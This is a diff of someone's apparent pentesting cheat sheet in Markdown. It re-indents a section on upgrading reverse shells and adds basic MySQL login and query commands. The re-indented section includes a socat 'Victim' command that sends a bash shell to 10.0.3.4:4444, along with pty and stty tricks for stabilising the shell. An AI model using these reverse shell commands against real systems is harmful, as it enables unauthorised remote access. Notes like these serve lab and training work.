@@ -157,35 +157,35 @@ gobuster dns -d [WEB SERVICE DOMAIN] -W [WORDLIST PATH]
 <br/>  
 
 * Using Python for a psuedo terminal  
-```console
-python -c 'import pty; pty.spawn("/bin/bash")'
-```  
+  ```console
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  ```  
 
 * Using socat  WORKED INSTEAD OF `nc`
-```console
-#Listener
-socat file:`tty`,raw,echo=0 tcp-listen:4444
+  ```console
+  #Listener
+  socat file:`tty`,raw,echo=0 tcp-listen:4444
 
-#Victim  
-socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.0.3.4:4444
-```  
+  #Victim  
+  socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.0.3.4:4444
+  ```  
 
 * Using stty options NOT WORKING WITH ME  
-```console
-# In reverse shell 
-python -c 'import pty; pty.spawn("/bin/bash")'
-ctrl-z  
+  ```console
+  # In reverse shell 
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  ctrl-z  
 
-# In Kali 
-stty raw -echo  
-fg
+  # In Kali 
+  stty raw -echo  
+  fg
 
-# In reverse shell
-reset
-export ShELL=bash
-export TERM=xterm-256color
-stty row <num> columns <cols>
-```  
+  # In reverse shell
+  reset
+  export ShELL=bash
+  export TERM=xterm-256color
+  stty row <num> columns <cols>
+  ```  
 * If we type `stty -a` it will give me info and I can get the rows and columns from there.
 * I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.  
 
@@ -295,20 +295,45 @@ stty row <num> columns <cols>
 ### <span class="useful_shit subtitle">Environment Variables  
 
   * To view the contents of an env variable
-  ```console
-  echo $[ENV VAR]
-  ```
+    ```console
+    echo $[ENV VAR]
+    ```
 
   * For the change in  the contents of a variable to be for all we have to export it  
-  ```console
-  export [ENVE VAR]
-  ```  
+    ```console
+    export [ENVE VAR]
+    ```  
 
 
  <br/><br/> 
 
 ### <span class="useful_shit subtitle">MySQL  
 
+  * To access mysql database on localhost we can use  
+    ```
+    mysql -u [USERNAME] -p
+    ```  
+
+  * To access the database remotely  
+    ```
+    mysql -u [USERNAME] -p [IP ADDRESS]
+    ```  
+
+  * In the default configuration of mysql the root user's password is *empty*.
+
+  * Mysql's command prompt. Some of its commands
+
+    ```console
+    mysql> show databases;
+    mysql> select * from [TABLE NAME];
+    mysql> use [DATABASE NAME];
+    mysql> show tables;
+    ```
+
+  * Mysql is a service that can be run on a computer and I can run it as follows
+    ```console
+    kali> service mysql start
+    ```
 
 
  <br/><br/> 
